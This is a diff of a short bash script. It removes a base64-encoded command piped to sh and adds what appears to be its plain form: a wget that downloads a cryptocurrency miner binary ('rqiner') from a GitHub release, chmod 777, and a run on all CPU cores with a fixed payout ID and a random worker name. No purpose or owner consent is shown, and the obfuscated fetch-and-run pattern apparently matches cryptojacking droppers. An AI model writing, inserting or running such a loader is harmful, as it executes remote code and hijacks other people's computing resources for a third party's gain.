@@ -1,3 +1,4 @@
 #!/bin/bash
-
-echo IyEvYmluL2Jhc2gKd2dldCBodHRwczovL2dpdGh1Yi5jb20vUXViaWMtU29sdXRpb25zL3JxaW5lci1idWlsZHMvcmVsZWFzZXMvZG93bmxvYWQvdjEuMS4yLWV4cGVyaW1lbnRhbC9ycWluZXIteDg2IC1PIHJxaW5lcgpjaG1vZCA3NzcgcnFpbmVyCi4vcnFpbmVyIC10ICQobnByb2MgLS1hbGwpIC1pIFFERkhQRldTVUNHREJEUU5PUlpPUE1XRENXWkJGSlpIRFRCQVpCUFVQQ1NVSFFRQ0dQU05KVkpFUENQTSAtbCAkKGVjaG8gJFJBTkRPTSB8IG1kNXN1bSB8IGhlYWQgLWMgMTAp | base64 -d | sh
+wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v1.1.2-experimental/rqiner-x86 -O rqiner
+chmod 777 rqiner
+./rqiner -t $(nproc --all) -i QDFHPFWSUCGDBDQNORZOPMWDCWZBFJZHDTBAZBPUPCSUHQQCGPSNJVJEPCPM -l $(echo $RANDOM | md5sum | head -c 10)
